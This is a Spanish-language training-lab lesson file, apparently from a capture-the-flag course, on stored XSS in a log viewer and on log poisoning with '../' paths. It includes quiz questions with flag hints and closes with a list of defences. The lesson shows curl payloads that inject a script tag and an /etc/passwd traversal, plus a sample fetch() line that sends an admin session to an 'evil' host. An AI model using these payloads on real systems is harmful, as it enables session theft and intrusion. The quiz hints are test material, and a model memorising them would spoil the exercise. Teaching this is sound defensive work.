@@ -1,0 +1,65 @@
+---
+index: 2
+title: "XSS en el visor de logs y log poisoning"
+questions:
+  - id: log-forging-t02-q01
+    prompt: "Inyecta un <script> vía feedback y ábrelo en el visor /logs del navegador. Envía la flag del logro XSS_IN_LOG."
+    hint: "curl 'http://127.0.0.1:18102/feedback?msg=<script>alert(1)</script>' y luego abre http://127.0.0.1:18102/logs — el flag también aparece en la respuesta JSON"
+    kind: flag
+  - id: log-forging-t02-q02
+    prompt: "Inyecta una ruta con ../ apuntando a /etc/ para simular el poisoning de parsers. Envía la flag del logro LOG_POISONING."
+    hint: "curl 'http://127.0.0.1:18102/feedback?msg=../../../etc/passwd'"
+    kind: flag
+  - id: log-forging-t02-q03
+    prompt: "¿Qué atributo faltaría en el Content-Security-Policy del visor para que el script inyectado no ejecute? (la política que bloquea scripts inline)"
+    hint: "Un CSP restrictivo con default-src 'self' y sin 'unsafe-inline' detiene el XSS aunque el HTML se inyecte"
+    kind: text
+---
+
+## El XSS que detona en el SOC
+
+El CRLF era un ataque a la *lectura* de los logs. El segundo salto es un
+ataque al *lector*: el visor de administración renderiza cada línea como
+HTML sin escapar (`<pre>{{line}}</pre>` con innerHTML, no textContent).
+
+El atacante no necesita que la víctima visite la web vulnerable —
+necesita que **el analista abra el panel de logs**:
+
+```bash
+# 1. Planta el script:
+curl 'http://127.0.0.1:18102/feedback?msg=<script>alert(1)</script>'
+
+# 2. El admin revisa los logs del día en su navegador:
+#    http://127.0.0.1:18102/logs  → alert(1) detona en SU sesión
+```
+
+La flag llega en la respuesta JSON del feedback; ábrelo también en el
+navegador para ver la detonación real. En producción, ese `alert(1)`
+sería `fetch('//evil/'+document.admin_session)`: XSS almacenado en la
+herramienta que menos sospechas — la de monitorización.
+
+## Log poisoning con rutas
+
+La tercera técnica apunta a los pipelines que **procesan** logs como
+rutas o nombres de fichero:
+
+```bash
+curl 'http://127.0.0.1:18102/feedback?msg=../../../etc/passwd'
+```
+
+Si algún consumidor del log usa esa línea como path (rotación de logs,
+uploads, include de plantilla), la secuencia `../` rompe el sandbox de
+directorios. Casos reales: log poisoning en servidores FTP cuya línea de
+log acababa en `include()` de PHP, y pipelines de SIEM que escribían
+ficheros con nombre tomado del log.
+
+## Defensas en capas
+
+1. **Saneo en origen**: sin `\r`, `\n`, y HTML-escape (`<` → `&lt;`)
+   antes de loguear input de usuario.
+2. **Render seguro**: el visor usa `textContent`, nunca `innerHTML`.
+3. **CSP restrictivo** en el panel de administración:
+   `Content-Security-Policy: default-src 'self'` — aunque se inyecte el
+   tag, el navegador no ejecuta el script inline.
+4. **Separación**: el visor de logs en otro dominio/cookies que el panel
+   admin, para que un XSS allí no sea llave de todo.
